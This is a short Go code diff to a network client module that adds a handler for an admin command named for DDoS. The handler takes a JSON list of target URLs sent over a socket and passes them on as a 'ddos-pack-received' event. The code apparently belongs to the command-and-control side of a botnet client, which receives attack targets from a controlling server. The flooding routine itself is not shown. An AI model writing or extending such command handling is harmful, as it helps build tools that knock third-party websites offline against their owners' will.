@@ -2,13 +2,25 @@ package modules
 
 import (
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"icu/common/constants"
 	"icu/common/types"
 	"icu/common/utils"
 	"icu/lib"
 	"net"
+	"sync"
+
+	jsoniter "github.com/json-iterator/go"
 )
+
+var json = jsoniter.ConfigCompatibleWithStandardLibrary
+
+var receiveBufPool = sync.Pool{
+	New: func() any {
+		return make([]byte, 0, constants.MAX_PACKET_SIZE)
+	},
+}
 
 type ClientModule struct {
 	sock           net.Conn
@@ -108,6 +120,16 @@ func (this *ClientModule) ParseData(socketBuf []byte) {
 		break
 
 	case constants.ADMIN_PACKET_CTYPE_COMMAND_DDOS:
+		urlsBytes := this.receiveBuf[5:]
+
+		var urls []string
+		if err := json.Unmarshal(urlsBytes, &urls); err != nil {
+			this.logger.Error(fmt.Sprintf("Failed parse (%s) to []string", hex.EncodeToString(urlsBytes)))
+			return
+		}
+
+		this.emitter.Emit("ddos-pack-received", urls)
+		break
 
 	default:
 		this.emitter.Emit("error", fmt.Sprintf("Failed to get/parse type_is (%d)", packetType))
